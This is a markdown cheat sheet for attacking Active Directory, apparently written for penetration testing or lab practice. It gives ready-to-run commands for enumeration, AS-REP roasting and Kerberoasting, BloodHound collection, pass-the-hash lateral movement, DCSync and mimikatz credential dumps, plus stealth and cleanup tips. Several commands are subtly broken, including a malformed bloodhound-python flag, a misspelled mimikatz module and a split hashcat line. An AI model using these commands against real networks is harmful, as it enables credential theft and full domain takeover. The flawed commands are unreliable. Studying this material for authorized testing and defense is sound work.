# AD Enumeration & Attacks

A compact, practical, start→finish playbook for Active Directory enumeration and attacks tuned for **Arch / BlackArch** environments.

---

## Table of contents

1. Discovery
2. SMB / LDAP / DNS enumeration
3. User & group enumeration
4. Kerberos attacks (AS-REP & Kerberoast)
5. Graphing with BloodHound (collection → analysis)
6. Lateral movement & credential use
7. Escalation to Domain-Admin & domain takeover
8. Cleanup & detection awareness
9. Appendix: useful command snippets & cracking hints

---

## Scoped discovery

Goal: find hosts, determine DCs, identify open AD ports.

Fast host discovery:

```sh
fping -asgq 10.10.10.0/24

sudo masscan 10.10.10.0/24 -p0-65535 --rate 10000 -oG masscan.gnmap
```

Targeted nmap (AD surface ports):

```sh
sudo nmap -sS -Pn -p 53,88,135,139,389,445,464,636,3268,3389,5985 \
  -sC -sV -oA dc_ports 10.10.10.0/24
```

* 88 = \[Kerberos\] 389/636 = \[LDAP\] 445 = SMB \[3268\] = Global Catalog \[464\] = Kerberos pw change \[3389\] = RDP \[5985/5986\] = WinRM.

* * *

## [SMB](#root/28cJWDhzjTH9/AICBIkIrnTcN/CWZuDvyiEB1C/v0OT8KaIGrhj) / LDAP / [DNS](#root/28cJWDhzjTH9/AICBIkIrnTcN/CWZuDvyiEB1C/Za1mUiMjPpZx) enumeration

Prefer tools that produce structured output.

SMB enumeration:

```sh
enum4linux-ng -a DC_IP | tee enum4linux-ng.out

smbmap -H DC_IP

# anonymous listing (may be blocked)
smbclient -L //DC_IP -N
```

LDAP domain dump:

```sh
ldapdomaindump ldap://DC_IP -o ldapdump_public

# authenticated:
ldapdomaindump ldap://DC_IP -u 'DOMAIN\\user' -p 'Passw0rd' -o ldapdump_auth
```

DNS / SRV records:

```sh
dig @DC_IP _ldap._tcp.dc._msdcs.DOMAIN SRV +short
dig @DC_IP _kerberos._tcp.DOMAIN SRV +short
host -t SRV _ldap._tcp.dc._msdcs.DOMAIN DC_IP
```

Collect outputs early; users, groups, SPNs, GPO metadata, and computer objects are high-value.

* * *

## [User & group enumeration](#root/28cJWDhzjTH9/OzZQdlkKZ4Hk/s1iuFdShDbb4/XvcfB8C7rzB1/3ZmAv4uJ31Ae)

Produce a validated username list.

Extract users from `ldapdomaindump` JSON/TSV (script?) → `users.txt`.

Kerberos username validation:

```sh
kerbrute userenum --dc DC_IP DOMAIN users.txt
```

CME LDAP/SMB enumeration:

```sh
# no creds
netexec smb DC_IP --shares
netexec smb DC_IP -u '.' -p --shares
netexec ldap DC_IP -u 'DOMAIN\\user' -p 'Passw0rd' --users
```

Notes:

* Use validation to reduce false-positives before brute-force or large Kerberos requests.
* Rate limit attempts to avoid lockouts when practicing password spraying.

* * *

## Kerberos attacks (AS-REP & Kerberoast)

High ROI attacks that produce offline-crackable materials.

### [AS-REP Roasting](https://www.thehacker.recipes/ad/movement/kerberos/asreproast)

Find accounts with "Do not require Kerberos preauthentication":

```sh
GetNPUsers.py DOMAIN/ -no-pass -dc-ip DC_IP -usersfile users.txt -outputfile asrep_hashes.txt
```

Crack with `hashcat` / `john` (mode depends on format — commonly `18200` for hashcat, verify format).

### [Kerberoast](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast)

Requires a valid domain user credential (any low-priv user).

```sh
GetUserSPNs.py DOMAIN/attackeruser:Password@DC_IP -outputfile kerberoast.hashes

GetUserSPNs.py -dc-ip 172.16.5.5 EXAMPLE.LOCAL/flank:pass -request-user sqldev -outputfile sqldev_tgs
```

Crack with `hashcat` (mode often 13100 for RC4/older; check current modes).

Notes:

* Impacket tools change; update impacket if tools fail.
* AS-REP has high ROI when target accounts have preauth disabled.

* * *

## BloodHound collection & analysis

Collector options:

* SharpHound (C#) — most complete.
* bloodhound-python — Python collector.

SharpHound usage (from a Windows host where you can execute):

```
.\SharpHound.exe -c All
# produced zip(s) → exfil to attacker and import into BloodHound
```

Linux (w/creds):

```sh
sudo bloodhound-python -u '' -p '' -ns 10.10.10.100 -example.local -c all --zip
```

Raw Queries:

```
# Check for WinRM access
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2

# SQL Admin rights
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

BloodHound queries to run:

* Shortest Paths to Domain Admins
* Find Principals with Unconstrained Delegation
* Find Principals with Writeable ACLs
* Find Kerberoastable users

Interpretation:

* Prioritize low-effort shortcuts: unconstrained delegation, ACL write paths, Kerberoastable accounts.

* * *

## Lateral movement & credential use

Use cracked creds or NTLM hashes with Impacket/CME.

Common commands:

```sh
# psexec (Impacket)
python3 /usr/share/impacket/examples/psexec.py 'DOMAIN/Administrator:Pass@TARGET'

# wmiexec (Impacket)
python3 /usr/share/impacket/examples/wmiexec.py 'DOMAIN/user:Pass@TARGET'

# secretsdump (Impacket)
python3 /usr/share/impacket/examples/secretsdump.py DOMAIN/ADMIN:Pass@TARGET

# CME example
netexec smb TARGET -u 'user' -p 'Pass' --exec-method smbexec -x 'whoami && hostname'

# Pass-the-hash with CME
netexec smb TARGET -u 'Administrator' -H '<NTLM_HASH>' --exec-method smbexec -x 'whoami'
```

Evil-WinRM if WinRM enabled:

```sh
evil-winrm -i TARGET -u 'user' -p 'Pass'
```

Notes:

* Use `--exec-method` in CME to try different exec paths (smbexec, wmiexec, psexec, etc.).
* For stealth, prefer methods that do not leave persistent artifacts on disk (e.g., wmiexec).

* * *

## Escalation to Domain-Admin & domain takeover

If you gain privileged accounts or replication privileges, you can extract domain data.

DCSync (Impacket/secretsdump):

```sh
secretsdump.py -just-dc-ntlm DOMAIN/replicator:Pass@DC_IP

# Dump all ntlm
secretsdump.py example.local/flank:P@ssword@10.10.10.161 > hashes.out
```

NTDS.dit extraction (requires SYSTEM and file access):

* Dump NTDS and SYSTEM hives, then use `secretsdump.py`/`ntdsutil` conversions.

Elevate and dump hashes:

```
runas /netonly /user:DOMAIN\user powershell

.\mimikatz.exe
privelege::debug
lsadump::dcsync /domain:DOMAIN.LOCAL /user:DOMAIN\administrator
```

* * *

## Cleanup & detection awareness

Housekeeping:

* Remove uploaded collectors and tools (SharpHound, chisel, mimikatz if used).
* Remove scheduled tasks or services created.
* Keep a `postop.log` with exact commands and timestamps.

Detection signals:

* High-rate LDAP queries / unusual filters.
* Elevated Kerberos request patterns (many AS/TGS requests).
* SharpHound collection and zip exfil.
* DCSync RPC calls.

* * *

## Useful command snippets & cracking hints

### Hash cracking

* AS-REP:  mode `18200`
* Kerberoast: mode `13100`
* NTLM: mode `1000`
* NTLMv2: mode `5600`

Example:

```sh
hashcat -m 18200 asrep_hashes.txt /path/to/wordlist.txt
hashcat -m 13100 kerberoast.hashes /path/to/wordlist.txt

hashcat -m 1000 --user hashes.asep ~/scratchpad/rockyou.txt /
-r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule
```

---
